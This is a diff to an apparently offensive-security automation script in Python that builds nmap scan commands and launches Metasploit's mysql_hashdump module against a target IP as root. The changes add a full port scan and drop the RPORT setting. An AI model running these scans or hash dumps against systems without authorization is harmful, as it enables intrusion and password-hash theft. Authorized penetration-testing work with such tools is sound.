@@ -68,9 +68,9 @@ def main():
                     if scan_type == '1':
                         command = f"sudo nmap -T4 -F {ip} -oN {output_file}"
                     elif scan_type == '2':
-                        command = f"sudo nmap -sV -sC -T4 -vv -oA fullscan {ip} -oN {output_file}"
+                        command = f"sudo nmap -sV -sC -T4 -p- -oA fullscan {ip} -oN {output_file}"
                     elif scan_type == '3':
-                        command = f"sudo nmap -sV -sC -T4 -vv --top-ports 100 {ip} -oN {output_file}"
+                        command = f"sudo nmap -sV -sC -T4 --top-ports 100 {ip} -oN {output_file}"
                     else:
                         command = f"sudo nmap -Pn -sU -sV -sC --top-ports=20 {ip} -oN {output_file}"
                     print(f"{GREEN}Starting!!!\n{RESET}")
@@ -556,7 +556,7 @@ def main():
 
                             print("")
 
-                            metasploit_command = f"msfconsole -q -x 'use scanner/mysql/mysql_hashdump; set RHOSTS {ip}; set RHOST {ip}; set RPORT 3306; set username root; run; exit'"
+                            metasploit_command = f"msfconsole -q -x 'use scanner/mysql/mysql_hashdump; set RHOSTS {ip}; set RHOST {ip}; set username root; run; exit'"
                             os.system(metasploit_command)
 
                             print("")
